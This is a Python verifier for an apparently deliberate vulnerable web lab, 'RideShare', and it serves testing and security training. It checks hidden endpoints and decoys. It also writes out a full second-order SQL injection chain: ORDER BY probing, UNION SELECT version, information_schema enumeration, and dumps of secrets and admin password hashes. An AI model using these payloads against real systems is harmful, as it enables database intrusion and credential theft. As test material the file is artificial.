#!/usr/bin/env python3
"""Verifier for RideShare. Usage: verify_rideshare.py http://host:port  (prints PASS/FAIL only)."""
import os
import re
import sys

import requests

ROOT = sys.argv[1].rstrip("/")
B = ROOT + "/rides"
FLAG = re.compile(r"FLAG\{rideshare_[a-z_0-9]+\}")
VER = re.compile(r"\b\d+\.\d+\.\d+\b")
HIDDEN_PATHS = ["digest"]            # real hidden endpoint
HIDDEN_DECOYS = ["reviews", "stats"]  # hidden but safe
HINTS = re.compile(r"\b(sql\w*|inject\w*|vulnerab\w*|flag|lab|hint|debug|mysql|mssql)\b", re.I)
T = 15


def step(name, ok):
    print(f"{name}: {'PASS' if ok else 'FAIL'}")


def get(path, **kw):
    return requests.get(B + path, timeout=T, **kw)


def cells(html):
    return re.findall(r"<td>([^<]*)</td>", html)


def subscribe(frm, to="y"):
    r = requests.post(B + "/subscribe", data={"email": "t@example.org", "from_city": frm, "to_city": to}, timeout=T)
    m = re.search(r"alert number is (\d+)", r.text)
    return (int(m.group(1)) if m else None), r


def digest_for(frm):
    n, _ = subscribe(frm)
    if n is None:
        return ""
    return get("/digest", params={"ref": n}).text


def crawl():
    seen, todo, pages = set(), ["/rides/"], {}
    while todo and len(seen) < 300:
        u = todo.pop()
        if u in seen:
            continue
        seen.add(u)
        r = requests.get(ROOT + u, timeout=T)
        pages[u] = r.text
        for h in re.findall(r"""(?:href|action)=["']([^"']+)["']""", r.text):
            h = h.replace("&amp;", "&")
            if h.startswith("/rides") and h not in seen:
                todo.append(h)
    return pages


def visible(html):
    html = re.sub(r"<style.*?</style>", " ", html, flags=re.S)
    return re.sub(r"<[^>]+>", " ", html)


def main():
    # --- baseline pages (no accounts anywhere)
    step("site-pages-ok", all(get(p).status_code == 200 for p in ("/", "/browse", "/cities", "/drivers", "/about", "/contact", "/subscribe", "/ride?id=1")))
    step("no-login-pages", all(get(p).status_code in (403, 404) for p in ("/login", "/register", "/account", "/logout", "/staff/login")))
    step("admin-static-403", get("/admin").status_code == 403 and get("/backup").status_code == 403)
    step("no-auth-cookies", not get("/").cookies and not get("/ride?id=1").cookies)

    # --- hidden endpoint: found by fuzzing only
    pages = crawl()
    blob = "\n".join(pages.values())
    r404 = get("/zzqxnotthere9")
    step("hidden-endpoint-not-404", all(get("/" + h).status_code == 200 for h in HIDDEN_PATHS + HIDDEN_DECOYS))
    step("nonexistent-is-404", r404.status_code == 404)
    for h in HIDDEN_PATHS + HIDDEN_DECOYS:
        step(f"hidden-{h}-not-linked", ("/rides/" + h) not in blob.lower() and (h != "digest" or "digest" not in blob.lower()))
    step("hidden-param-not-linked", not re.search(r"[?&;]ref=", blob))
    step("hidden-not-in-robots-sitemap", all(requests.get(ROOT + p, timeout=T).status_code == 404 for p in ("/robots.txt", "/sitemap.xml", "/rides/robots.txt", "/rides/sitemap.xml")))
    base = get("/digest")
    with_ref = get("/digest", params={"ref": 1})
    other = get("/digest", params={"zzparam": 1})
    step("hidden-param-distinguishable", len(with_ref.text) != len(base.text) and len(other.text) == len(base.text) and "Route alert" in with_ref.text)
    n, conf = subscribe("Springfield")
    step("form-stores-ok", n is not None and "digest" not in conf.text.lower() and not re.search(r"[?&;]ref=", conf.text))
    wl = "/usr/share/wordlists/dirb/common.txt"
    if os.path.exists(wl):
        words = set(open(wl, errors="ignore").read().split())
        step("hidden-endpoints-in-common-wordlist", all(h in words for h in HIDDEN_PATHS + HIDDEN_DECOYS))
    wl = "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
    if os.path.exists(wl):
        words = set(open(wl, errors="ignore").read().split())
        step("hidden-param-in-burp-wordlist", "ref" in words)
    step("no-hint-words", not HINTS.search(visible(blob)) and not re.search(r"lab", visible(blob), re.I))
    step("no-html-comments", "<!--" not in blob)

    # --- second-order injection through the stored route text
    step("stored-quote-no-error", "could not be prepared" in digest_for("x'") and "could not be prepared" not in digest_for("Springfield"))
    t = digest_for("x' ORDER BY 6-- -")
    step("order-by-6-ok", "could not be prepared" not in t and "No upcoming" in t)
    t = digest_for("x' ORDER BY 7-- -")
    step("order-by-7-error", "could not be prepared" in t)
    t = digest_for("x' UNION SELECT 1,version(),3,4,5,6-- -")
    step("digest-union-version", bool(VER.search(" ".join(cells(t)))))
    t = digest_for("x' UNION SELECT 1,group_concat(table_name),3,4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -")
    c = " ".join(cells(t))
    step("digest-union-tables", all(x in c for x in ("ops_secrets", "admin_accounts", "users", "rides")))
    t = digest_for("x' UNION SELECT 1,group_concat(column_name),3,4,5,6 FROM information_schema.columns WHERE table_name='ops_secrets'-- -")
    c = " ".join(cells(t))
    step("digest-union-columns", "secret_value" in c and "label" in c)
    t = digest_for("x' UNION SELECT 1,label,secret_value,4,5,6 FROM ops_secrets-- -")
    step("digest-union-dump-flag", bool(FLAG.search(t)))
    t = digest_for("x' UNION SELECT 1,username,password_hash,4,5,6 FROM admin_accounts-- -")
    step("digest-union-dump-rows", "superadmin" not in t and "ops.admin" in t and len(re.findall(r"[0-9a-f]{64}", t)) >= 4)
    t = digest_for("<b>x</b>")
    step("output-escaped", "&lt;b&gt;x&lt;/b&gt;" in t and "<b>x</b>" not in t)

    # --- decoys: visible rabbit holes + hidden decoys must not be injectable
    pl = "x' UNION SELECT 1,2,3,4,5,6,7,8-- -"
    pv = "x' UNION SELECT 1,version(),3,4,5,6,7,8-- -"
    probes = {
        "decoy-ride-id": ("/ride", {"id": "1' UNION SELECT 1,version(),3,4,5,6,7,8,9,10,11,12-- -"}),
        "decoy-ride-id-or": ("/ride", {"id": "1 OR 1=1"}),
        "decoy-search-from": ("/search", {"from": pv, "to": ""}),
        "decoy-search-to": ("/search", {"from": "", "to": pv}),
        "decoy-driver-name": ("/driver", {"name": pv}),
        "decoy-city-name": ("/city", {"name": pv}),
        "decoy-browse-sort": ("/browse", {"sort": pv}),
        "decoy-browse-page": ("/browse", {"page": "1 UNION SELECT 1"}),
        "decoy-hidden-reviews-id": ("/reviews", {"id": "1 UNION SELECT 1,2,3"}),
        "decoy-hidden-stats-city": ("/stats", {"city": pv}),
    }
    for name, (p, params) in probes.items():
        r = get(p, params=params)
        step(name, r.status_code == 200 and not VER.search(visible(r.text)) and not FLAG.search(r.text))
    r = get("/ride", params={"id": "1' OR '1'='1"})
    step("decoy-ride-id-quote-not-found", "could not be found" in r.text)
    r = get("/driver", params={"name": "Maya Chen' OR '1'='1"})
    step("decoy-driver-quote-not-found", "No driver found" in r.text)
    r = get("/city", params={"name": "Springfield' OR '1'='1"})
    step("decoy-city-quote-not-found", "do not have a city" in r.text)
    r = get("/stats", params={"city": "Springfield' OR '1'='1"})
    step("decoy-stats-quote-no-match", "No match" in r.text)
    r = get("/reviews", params={"id": "1 OR 1=1"})
    step("decoy-reviews-or-no-match", "No match" in r.text)
    r = get("/digest", params={"ref": "1 OR 1=1"})
    step("decoy-digest-ref-is-numeric-only", "No match" in r.text)
    r = get("/digest", params={"ref": "1' UNION SELECT 1"})
    step("decoy-digest-ref-quote", "No match" in r.text)
    step("decoy-contact-form", "received" in requests.post(B + "/contact", data={"name": "x' OR 1=1-- -", "email": "a@b.co", "message": "' UNION SELECT 1-- -"}, timeout=T).text)


main()
